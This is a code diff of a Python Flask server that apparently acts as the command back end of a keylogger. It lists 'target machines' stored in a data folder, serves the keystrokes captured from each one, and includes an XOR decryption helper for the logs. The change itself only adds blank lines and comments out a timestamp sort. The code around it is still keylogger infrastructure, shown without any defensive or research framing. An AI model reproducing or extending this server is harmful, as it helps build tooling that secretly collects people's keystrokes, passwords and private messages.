@@ -4,6 +4,9 @@ from flask import Flask, jsonify, request, json
 from flask_cors import CORS
 import time
 
+
+
+
 DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
 
 def generate_log_filename():
@@ -60,10 +63,12 @@ def decrypt(key: str, data: str):
     decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
     return decrypted
 
+
 @app.route('/api/get_target_machines_list', methods=['GET'])
 def get_target_machines_list():
     machines = os.listdir(DATA_FOLDER)
     return jsonify({"machines": machines}), 200
+
 
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_target_machine_key_strokes():
@@ -88,11 +93,11 @@ def get_target_machine_key_strokes():
         except json.JSONDecodeError:
             print(f"Warning: Skipping corrupted file {file_path}")
 
-    # Sort by timestamp (assuming valid timestamps)
-    try:
-        keystrokes.sort(key=lambda x: datetime.strptime(x["timestamp"], "%Y-%m-%d %H:%M:%S"))
-    except KeyError:
-        return jsonify({"error": "Invalid data format in logs"}), 500
+    # # Sort by timestamp (assuming valid timestamps)
+    # try:
+    #     keystrokes.sort(key=lambda x: datetime.strptime(x["timestamp"], "%Y-%m-%d %H:%M:%S"))
+    # except KeyError:
+    #     return jsonify({"error": "Invalid data format in logs"}), 500
 
     return jsonify({"keystrokes": keystrokes}), 200
 
